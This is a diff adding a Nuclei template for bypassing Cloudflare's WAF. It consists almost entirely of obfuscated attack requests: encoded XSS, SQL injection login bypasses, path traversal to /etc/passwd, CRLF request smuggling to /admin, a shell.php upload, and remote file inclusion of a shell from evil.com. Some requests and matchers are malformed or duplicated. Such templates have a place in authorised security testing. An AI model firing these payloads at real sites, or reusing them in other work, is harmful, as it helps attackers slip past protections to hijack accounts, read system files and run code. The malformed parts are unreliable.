@@ -1,0 +1,364 @@
+id: cloudflare-waf-bypass-complex-payloads
+
+info:
+  name: Cloudflare WAF Bypass with Complex Payloads
+  author: akm626
+  severity: medium
+  description: |
+    Comprehensive Nuclei template to test advanced bypass techniques specifically targeting Cloudflare's WAF. Includes highly obfuscated and complex payloads designed to evade Cloudflare's signature-based detection. Tests various encoding, splitting, and injection methods across multiple HTTP methods and headers.
+  tags: waf,bypass,cloudflare,xss,sqli,lfi,rfi,complex-obfuscation,intrusive
+
+http:
+  - raw:
+      - |
+        GET /search?q=%253C%2573%2563%2572%2569%2570%2574%253E%2561%256C%2565%2572%2574%2528%2527%2558%2553%2553%2527%2529%253C%252F%2573%2563%2572%2569%2570%2574%253E HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
+        X-Forwarded-For: 127.0.0.1
+
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "<script>alert('XSS')</script>"
+      - type: word
+        part: body
+        words:
+          - "blocked"
+          - "403 Forbidden"
+        negative: true
+
+  - raw:
+      - |
+        POST /login HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+        User-Agent: Mozilla/5.0
+
+        username=admin' OR 1=1 --&password=test
+
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "Welcome"
+      - type: word
+        part: body
+        words:
+          - "blocked"
+          - "403 Forbidden"
+        negative: true
+
+  - raw:
+      - |
+        GET /file?path=%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%65%74%63%2F%70%61%73%73%77%64 HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (compatible; Nuclei/3.0)
+
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "root:"
+      - type: word
+        part: body
+        words:
+          - "blocked"
+          - "403 Forbidden"
+        negative: true
+
+  - raw:
+      - |
+        POST /include HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundary7MA4YWxkTrZu0gW
+        Transfer-Encoding: chunked
+        User-Agent: Mozilla/5.0
+
+        test
+
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "shell executed"
+      - type: word
+        part: body
+        words:
+          - "blocked"
+          - "403 Forbidden"
+        negative: true
+
+  - raw:
+      - |
+        GET /comment?msg=%3C%53%43%52%49%50%54%3E%61%6C%65%72%74%28%27%58%53%53%27%29%3C%2F%53%43%52%49%50%54%3E%00%3Cimg%20src=x%20onerror=alert(1)%3E HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36
+
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "alert('XSS')"
+      - type: word
+        part: body
+        words:
+          - "blocked"
+          - "403 Forbidden"
+        negative: true
+
+  - raw:
+      - |
+        GET /download?file=%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252F%65%74%63%252F%70%61%73%73%77%64%253F%2500..%252F..%252Fetc%252Fpasswd HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0
+        Accept-Encoding: gzip, deflate
+
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "root:x:"
+      - type: word
+        part: body
+        words:
+          - "blocked"
+          - "403 Forbidden"
+        negative: true
+
+  - raw:
+      - |
+        POST /api/search HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+        User-Agent: Mozilla/5.0
+        X-Custom-Header: ' OR 1=1 --%0d%0aHost: {{Hostname}}%0d%0aContent-Length: 0%0d%0a%0d%0aGET /admin HTTP/1.1
+
+        {"query":"admin' OR 1=1 --"}
+
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "admin"
+      - type: word
+        part: body
+        words:
+          - "blocked"
+          - "403 Forbidden"
+        negative: true
+
+  - raw:
+      - |
+        GET /search?q=PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4= HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0
+        X-Forwarded-For: 127.0.0.1
+
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "<script>alert('XSS')</script>"
+      - type: word
+        part: body
+        words:
+          - "blocked"
+          - "403 Forbidden"
+        negative: true
+
+  - raw:
+      - |
+        POST /upload HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundary7MA4YWxkTrZu0gW
+        User-Agent: Mozilla/5.0
+
+        ----WebKitFormBoundary7MA4YWxkTrZu0gW
+        Content-Disposition: form-data; name="file"; filename="shell.php"
+
+        ----WebKitFormBoundary7MA4YWxkTrZu0gW--
+
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "shell executed"
+      - type: word
+        part: body
+        words:
+          - "blocked"
+          - "403 Forbidden"
+        negative: true
+
+  - raw:
+      - |
+        GET /search?q=admin' OR 1=1 --%0d%0aHost: {{Hostname}}%0d%0aContent-Length: 0%0d%0a%0d%0aGET /admin HTTP/1.1 HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0
+
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "admin"
+      - type: word
+        part: body
+        words:
+          - "blocked"
+          - "403 Forbidden"
+        negative: true
+
+  - raw:
+      - |
+        GET /file?path=%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%65%74%63%2F%70%61%73%73%77%64 HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (compatible; Nuclei/3.0)
+
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "root:"
+      - type: word
+        part: body
+        words:
+          - "blocked"
+          - "403 Forbidden"
+        negative: true
+
+  - raw:
+      - |
+        GET /search?q=eval%28%22YWxlcnQoJ1hTUycp%22%29 HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0
+
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "alert('XSS')"
+      - type: word
+        part: body
+        words:
+          - "blocked"
+          - "403 Forbidden"
+        negative: true
+
+  - raw:
+      - |
+        POST /api/comment HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+        User-Agent: Mozilla/5.0
+
+        {
+          "query": "<script>alert('XSS')</script>"
+        }
+
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "<script>alert('XSS')</script>"
+      - type: word
+        part: body
+        words:
+          - "blocked"
+          - "403 Forbidden"
+        negative: true
+
+  - raw:
+      - |
+        POST /login HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+        User-Agent: Mozilla/5.0
+
+        username=admin\u0027 OR 1=1 --&password=test
+
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "Welcome"
+      - type: word
+        part: body
+        words:
+          - "blocked"
+          - "403 Forbidden"
+        negative: true
+
+  - raw:
+      - |
+        POST /include HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundary7MA4YWxkTrZu0gW
+        User-Agent: Mozilla/5.0
+
+        ----WebKitFormBoundary7MA4YWxkTrZu0gW
+        Content-Disposition: form-data; name="url"
+
+        http://evil.com/shell.php%3Fcmd%3Dls
+
+        ----WebKitFormBoundary7MA4YWxkTrZu0gW--
+
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "shell executed"
+      - type: word
+        part: body
+        words:
+          - "blocked"
+          - "403 Forbidden"
+        negative: true
+
+variables:
+  Hostname: '{{BaseURL}}'
